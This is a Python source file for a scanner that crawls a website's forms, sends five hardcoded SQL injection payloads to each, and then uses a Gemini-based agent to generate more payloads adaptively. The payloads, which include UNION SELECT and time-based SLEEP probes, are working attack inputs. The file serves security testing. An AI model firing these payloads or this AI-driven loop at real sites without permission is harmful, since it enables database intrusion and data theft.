from main.service.crawler import WebCrawler
from main.tests.sql_injection import SQLInjector
from main.service.sql_generator import GeminiFeedbackAgent


class Scaner:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.crawler = WebCrawler(self.base_url)
        self.injector = SQLInjector()
        self.ai = GeminiFeedbackAgent()

    def crawl(self):
        surface = self.crawler.run()
        attack_results = []

        for page in surface:
            for form in page["forms"]:
                print(f"\n[+] Testing form at {form['action']}")

                # 1. Define the 5 hardcoded history queries
                seed_payloads = [
                    "' OR 1=1--",
                    "'/**/OR/**/1=1--",
                    "' AND 1=2--",
                    "' UNION SELECT NULL,NULL--",
                    "' OR IF(1=1,SLEEP(5),0)--"
                ]

                history = {}

                def tester(payload):
                    return self.injector.send_payload(form, payload)

                # 2. Run the 5 history queries FIRST
                print("--- Running Initial Seed Payloads ---")
                for payload in seed_payloads:
                    history[payload] = tester(payload)
                    print(f"[SEED] {payload} -> {history[payload]}")

                # 3. Enter the AI feedback loop using the existing history
                # This will generate 5 queries per round based on these results
                ai_results = self.ai.adaptive_loop(tester, initial_history=history, max_rounds=4)

                attack_results.append({
                    "url": form["action"],
                    "initial_tests": history,
                    "ai_discovered": ai_results
                })

        return attack_results